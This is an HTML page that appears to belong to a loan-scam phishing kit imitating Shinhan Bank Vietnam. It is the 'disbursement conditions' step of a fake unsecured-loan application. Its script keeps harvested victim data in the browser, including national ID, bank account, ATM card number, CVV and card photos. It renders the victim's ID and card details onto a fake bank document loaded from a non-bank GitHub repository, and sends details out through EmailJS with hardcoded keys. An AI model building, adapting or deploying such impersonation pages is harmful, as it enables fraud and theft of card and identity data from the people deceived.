<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Điều Kiện Giải Ngân - Shinhan Bank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            font-size: 16px;
            background-color: #f8f9fa;
            margin: 0;
        }
        .header {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
        }
        .header img {
            height: 50px;
        }
        .header h1 {
            font-size: 26px;
            font-weight: 700;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            position: relative;
        }
        .progress-bar-container {
            margin-bottom: 20px;
        }
        .progress-bar {
            height: 20px;
            background-color: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background-color: #28a745;
            transition: width 0.3s ease-in-out;
        }
        .step-title {
            color: #003087;
            font-size: 18px;
            font-weight: 700;
            text-align: center;
        }
        .step-description {
            font-size: 16px;
            text-align: center;
        }
        .image-section {
            text-align: center;
            margin: 20px 0;
        }
        #disbursementCanvas {
            width: 100%;
            max-width: 600px;
            min-height: 850px;
            margin: 20px auto;
            display: block;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            image-rendering: -webkit-optimize-contrast;
            image-rendering: crisp-edges;
        }
        #disbursementCanvas.loading {
            opacity: 0.5;
            background: url('https://via.placeholder.com/50x50?text=Loading') center center no-repeat;
        }
        .btn-download {
            background-color: #17a2b8;
            color: white;
            font-size: 16px;
            font-weight: 700;
            padding: 8px 16px;
            transition: all 0.3s ease;
        }
        .btn-download:hover {
            background-color: #138496;
            transform: translateY(-2px);
        }
        .btn-primary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #003087;
            border: none;
            transition: all 0.3s ease;
        }
        .btn-primary:hover {
            background-color: #00205B;
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0, 32, 91, 0.3);
        }
        .btn-secondary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #6c757d;
            border: none;
            position: absolute;
            top: 20px;
            left: 20px;
            transition: all 0.3s ease;
        }
        .btn-secondary:hover {
            background-color: #5a6268;
            transform: translateY(-2px);
        }
        .footer {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
            margin-top: 20px;
            font-size: 16px;
        }
        .footer img.lock-icon {
            vertical-align: middle;
            margin-right: 10px;
        }
        .footer-logo {
            height: 40px;
            margin-top: 10px;
        }
        .button-group {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }
        .step-transition {
            transition: opacity 0.5s ease, transform 0.5s ease;
            opacity: 1;
            transform: translateX(0);
        }
        .step-transition.hidden {
            opacity: 0;
            transform: translateX(20px);
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <div class="container">
        <button type="button" class="btn btn-secondary" onclick="window.location.href='step8.html'">Quay Lại</button>
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 90%"></div>
            </div>
        </div>

        <div id="step9" class="step-transition">
            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
            <p class="step-description">Dưới đây là điều kiện giải ngân của bạn. Vui lòng kiểm tra kỹ thông tin.</p>
            <div class="image-section">
                <canvas id="disbursementCanvas"></canvas>
            </div>
            <div class="button-group">
                <button id="downloadDisbursementBtn" class="btn btn-download">Tải Điều Kiện Giải Ngân (PDF)</button>
                <button id="proceedToFinalStepBtn" class="btn btn-primary">Hoàn Tất</button>
            </div>
        </div>

        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="mailto:support@shinhan.com.vn">support@shinhan.com.vn</a></p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS
        (function(){
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        // Placeholder user data (aligned with Step1)
        let userData = {
            fullName: "",
            idNumber: "",
            idIssueDate: "",
            idIssuePlace: "",
            address: "",
            occupation: "",
            income: "",
            phoneNumber: "",
            email: "",
            loanAmount: "",
            loanTerm: "",
            loanPurpose: "",
            accountNumber: "",
            bankName: "",
            termsAgree: false,
            loanCode: "",
            registrationDate: "",
            monthlyPayment: 0,
            interestRate: 0,
            sellerCode: "",
            storeCode: "",
            staffCode: "",
            staffName: "",
            branchName: "",
            isRegistered: false,
            qrData: {},
            atmCard: {
                cardNumber: "",
                cardHolderName: "",
                issueDate: "",
                expiryDate: "",
                cvv: "",
                frontImage: "",
                backImage: ""
            },
            currentStep: 9
        };

        // Format number to VND
        function formatNumber(number) {
            if (!number) return "Không có";
            return Number(number).toLocaleString('vi-VN');
        }

        // Save to localStorage
        function saveToLocalStorage() {
            try {
                localStorage.setItem('userData', JSON.stringify(userData));
                console.log('Saved userData to localStorage:', userData);
            } catch (error) {
                console.error('Error saving userData to localStorage:', error);
            }
        }

        // Load user data
        function loadUserData() {
            try {
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    userData = JSON.parse(storedData);
                    console.log('Loaded userData from localStorage for Step9:', userData);
                } else {
                    console.warn('No userData found in localStorage, using default.');
                }
            } catch (error) {
                console.error('Error parsing userData from localStorage:', error);
            }
        }

        // Render image and text on canvas
        function renderCanvas(canvasId, imageUrl, fallbackUrl) {
            const canvas = document.getElementById(canvasId);
            const ctx = canvas.getContext('2d');
            const img = new Image();
            img.crossOrigin = "Anonymous";
            img.src = imageUrl;

            canvas.classList.add('loading');

            img.onload = function() {
                canvas.classList.remove('loading');
                canvas.width = 2480;
                canvas.height = 3508;
                ctx.drawImage(img, 0, 0, 2480, 3508);
                canvasFields.forEach(field => {
                    const value = field.value || "Không có";
                    if (field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
                        ctx.font = field.font;
                        ctx.fillStyle = field.color;
                        ctx.fillText(value, field.x, field.y);
                    } else {
                        console.warn(`Invalid coordinates for field: ${value} at (${field.x}, ${field.y})`);
                    }
                });
                console.log('Rendered canvas with fields:', canvasFields.map(f => ({ value: f.value, x: f.x, y: f.y })));
            };

            img.onerror = function() {
                console.error('Failed to load image:', imageUrl);
                img.src = fallbackUrl;
                img.onload = function() {
                    canvas.classList.remove('loading');
                    canvas.width = 2480;
                    canvas.height = 3508;
                    ctx.drawImage(img, 0, 0, 2480, 3508);
                    ctx.fillStyle = '#000000';
                    ctx.font = '46px Arial';
                    ctx.fillText('Hình ảnh điều kiện giải ngân mặc định.', 20, 50);
                };
                img.onerror = function() {
                    canvas.classList.remove('loading');
                    ctx.fillStyle = '#000000';
                    ctx.font = '46px Arial';
                    ctx.fillText('Không thể tải hình ảnh điều kiện giải ngân.', 20, 50);
                };
            };
        }

        // Define text fields for canvas
        const canvasFields = [
            { label: "", value: userData.loanCode || "Không có", x: 414, y: 193, font: "54px Arial bold", color: "#000000" },
            { label: "", value: userData.accountNumber || "Không có", x: 846, y: 643, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.fullName || "Không có", x: 857, y: 707, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.bankName || "Không có", x: 846, y: 780, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.fullName || "Không có", x: 857, y: 887, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.idNumber || "Không có", x: 846, y: 974, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.idIssueDate || "Không có", x: 1413, y: 974, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.idIssuePlace || "Không có", x: 1904, y: 974, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.atmCard?.cardNumber || "Không có", x: 846, y: 1034, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.atmCard?.cardHolderName || "Không có", x: 846, y: 1094, font: "46px Arial bold", color: "#000000" }
        ];

        // Download canvas as PDF
        function downloadAsPDF(canvas, filename) {
            const { jsPDF } = window.jspdf;
            const pdf = new jsPDF({
                orientation: canvas.width > canvas.height ? 'landscape' : 'portrait',
                unit: 'px',
                format: [canvas.width, canvas.height]
            });
            pdf.addImage(canvas.toDataURL('image/png'), 'PNG', 0, 0, canvas.width, canvas.height);
            pdf.save(filename);
        }

        // Load user data and populate fields
        window.onload = function() {
            loadUserData();
            renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png', 'https://via.placeholder.com/2480x3508?text=Hinh+Dieu+Kien+Giai+Ngan');
        };

        // Download disbursement conditions
        $('#downloadDisbursementBtn').on('click', function() {
            const canvas = document.getElementById('disbursementCanvas');
            downloadAsPDF(canvas, `DieuKienGiaiNgan_${userData.loanCode || 'unknown'}.pdf`);
        });

        // Proceed to final step
        $('#proceedToFinalStepBtn').on('click', function() {
            const params = {
                to_name: userData.fullName || 'Khách hàng',
                loan_code: userData.loanCode || 'Không có',
                loan_amount: formatNumber(userData.loanAmount) || 'Không có',
                registration_date: userData.registrationDate || 'Không có',
                to_email: userData.email || 'support@shinhan.com.vn'
            };
            emailjs.send('service_60tgxof', 'template_uhyb8ve', params).then(() => {
                alert("Thông báo hoàn tất đăng ký đã được gửi qua email cho quý khách!");
                userData.isRegistered = true;
                userData.isCompleted = true;
                userData.currentStep = 10;
                saveToLocalStorage();
                window.location.href = 'step10.html';
            }).catch(error => {
                console.error('EmailJS error:', error);
                alert("Đã xảy ra lỗi khi gửi email. Vui lòng thử lại.");
            });
        });
    </script>
</body>
</html>
